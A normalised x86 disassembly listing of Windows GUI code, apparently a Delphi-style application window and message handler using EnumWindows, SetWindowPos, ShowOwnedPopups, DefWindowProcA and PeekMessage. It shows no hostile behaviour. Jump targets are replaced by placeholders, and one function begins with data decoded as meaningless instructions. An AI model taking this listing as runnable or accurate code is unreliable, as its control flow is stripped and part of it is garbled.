mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4585f8
cmp ebx eax
je r-xdata
sub_445334
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4452bc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_419898
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_445440
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0xd0 ]
call sub_406774
mov edx eax
test edx edx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ ebx + 0xd0 ]
xor ecx ecx
mov [ edx + esi * 4 + 0x4 ] ecx
mov eax [ ebx + 0xd0 ]
mov [ eax + esi * 4 ] 0xffffffff
jmp r-xdata
lea esi [ eax + eax * 2 ]
mov ecx [ ebx + 0xd0 ]
cmp edi [ ecx + esi * 4 + 0x4 ]
jne r-xdata
sub_445490
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_419898
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4454fc
adc [ ebx ] eax
aaa
xor [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
jo r-xdata
pushfd
dec ecx
add [ ebx ] bh
jo r-xdata
inc eax
add [ 0x6d726f46 ] al
jae r-xdata
add [ ebx + 0x4454f815 ] cl
add al ch
pushad
adc edi esp
inc [ ebx + 0x40a104c4 ]
pushfd
dec ecx
add al ch
xchg edi eax
adc esp edi
dec [ ebx + 0x499c4015 ]
add [ ecx - 0x74037d8c ] cl
je r-xdata
add [ ebx + 0x94bb ] al
add [ eax ] al
jne r-xdata
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
or edi 0xffffffff
push 0x4
push esi
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_419898
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_4198f4
test eax eax
jge r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
jmp r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x30 ]
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_419740
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ rw-data ]
call sub_40676c
inc eax
push eax
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov eax [ rw-data ]
call sub_40676c
mov edx [ rw-data ]
mov [ edx + eax * 4 - 0x4 ] esi
sub_4455ec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
cmp [ esi + 0x9c ] 0x0
jle r-xdata
cmp [ esi + 0x9c ] 0x0
jne r-xdata
dec [ esi + 0x9c ]
cmp [ esi + 0x9c ] 0x0
jne r-xdata
inc [ esi + 0x9c ]
jmp r-xdata
mov eax esi
call sub_447c2c
push eax
push r-xdata
call EnumWindows
cmp [ esi + 0x44 ] 0x0
je r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_419898
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
call sub_406774
mov edi eax
cmp edi 0x0
jl r-xdata
mov eax [ esi + 0x98 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x0
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_419898
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
call sub_406774
mov edi eax
cmp edi 0x0
jl r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
push 0x5
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_445780
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40ebcc
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_444344
mov eax [ rw-data ]
call sub_4449c4
sub_4457d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445835
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x162 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44583c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_405728
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x164 ]
call [ ebx + 0x160 ]
sub_445844
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_445880
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445f74
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_4458cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_445f57
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445780
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_446a88
jmp r-xdata
cmp eax 0x11
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx esi
call sub_419898
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1c
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov ebx eax
mov eax ebx
call sub_4585f8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x1d
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447c6c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4466b8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_44665c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b75c
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ rw-data ]
call sub_4449c4
push ebp
call sub_445844
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
push ebp
call sub_445844
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa5 ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub eax 0x14
je r-xdata
push ebp
call sub_445844
pop ecx
jmp [ eax * 4 + jump_table_445970 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_4585f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44641c
test al al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_445f74
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_445430
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_445490
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_445844
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b75c
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_445844
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41f7b4
jmp r-xdata
xor eax eax
call sub_43ba80
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov esi eax
mov eax ebx
call sub_4585f8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_451b4c
push esi
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445f90
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call sub_442a04
jmp r-xdata
push ebp
call sub_445844
pop ecx
jmp r-xdata
push ebp
call sub_445880
pop ecx
jmp r-xdata
push ebp
call sub_445844
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb4 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446070
jmp r-xdata
jmp r-xdata
call sub_432228
call sub_43238c
jmp r-xdata
jmp r-xdata
call sub_40f320
call sub_405388
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d684
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4457d8
push ebp
call sub_445844
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_445438
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_445844
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_445490
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4585f8
cmp eax [ rw-data ]
je r-xdata
push ebp
call sub_445844
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b920
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
call sub_43b9e4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb4 ] edx
mov eax [ rw-data ]
push eax
call SetFocus
sub_445f90
push ebx
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_43b75c
test eax eax
jne r-xdata
pop ebx
retn
mov [ rw-data ] 0x1
mov eax ebx
call sub_445430
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
xor edx edx
mov eax ebx
call sub_4455ec
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_444c44
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ ebx + 0x44 ]
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax ebx
call sub_44821c
test al al
je r-xdata
push 0x40
push 0x0
mov eax [ ebx + 0x44 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43dfbc
push eax
mov eax [ ebx + 0x44 ]
call sub_43df9c
push eax
mov eax [ ebx + 0x44 ]
call sub_4585f8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov dl 0x1
mov eax [ ebx + 0x44 ]
call sub_43fdb4
jmp r-xdata
cmp [ ebx + 0x142 ] 0x0
je r-xdata
sub_446070
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
call sub_43b75c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov eax ebx
call sub_44821c
test al al
je r-xdata
mov eax ebx
call sub_445490
mov dl 0x1
mov eax ebx
call sub_4455ec
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x273 ] 0x1
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push 0x9
mov eax [ ebx + 0x44 ]
call sub_4585f8
push eax
call ShowWindow
jmp r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
mov eax esi
call sub_4585f8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
xor edx edx
call sub_43fdb4
mov eax [ ebx + 0x44 ]
call sub_442bac
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_444c44
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
adc eax 0x0
sub_4461a0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4461dc
push ebx
push esi
add esp 0xfffffefc
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_405584
mov eax ebx
call sub_44821c
test al al
jne r-xdata
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_405620
mov eax [ esi ]
mov [ esp + 0x100 ] eax
mov eax [ esp + 0x100 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x104
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_405584
jmp r-xdata
sub_44625c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_4462a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x277 ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x277 ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x29c ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4462f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x109
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push esp
push ebp
call GetWindowThreadProcessId
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x30 ]
push eax
call GetWindowThreadProcessId
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_44d350
test al al
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4585f8
mov ebp eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call __imp_SendMessageA
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageW
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4463e8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xec ]
test al al
je r-xdata
mov eax ebp
call sub_4474a4
sub_44641c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x152 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4585f8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffa5
call sub_40484c
test al al
jne r-xdata
sub_446488
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ ebp ]
sub eax 0x11
je r-xdata
mov [ ebp + 0xc ] 0x1
sub eax 0xb038
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0xd0 ]
call sub_406774
test eax eax
jl r-xdata
inc eax
xor ebx ebx
inc ebx
dec eax
jne r-xdata
mov edx [ esi + 0xd0 ]
cmp [ edx + edi * 4 + 0x4 ] 0x0
je r-xdata
lea edi [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov edx [ edx + edi * 4 ]
cmp edx [ ebp + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_4585d4
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
call sub_4551b8
jmp r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 + 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_442c50
jmp r-xdata
sub_446524
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
test ebp ebp
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call IsWindowUnicode
test eax eax
jne r-xdata
mov [ esp ] al
cmp [ esp ] 0x0
je r-xdata
mov al 0x1
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
cmp eax 0x1
sbb eax eax
inc eax
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageW
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
test al al
je r-xdata
mov [ esi + 0xa4 ] 0x1
mov [ esp + 0x1 ] 0x0
cmp [ esi + 0x102 ] 0x0
je r-xdata
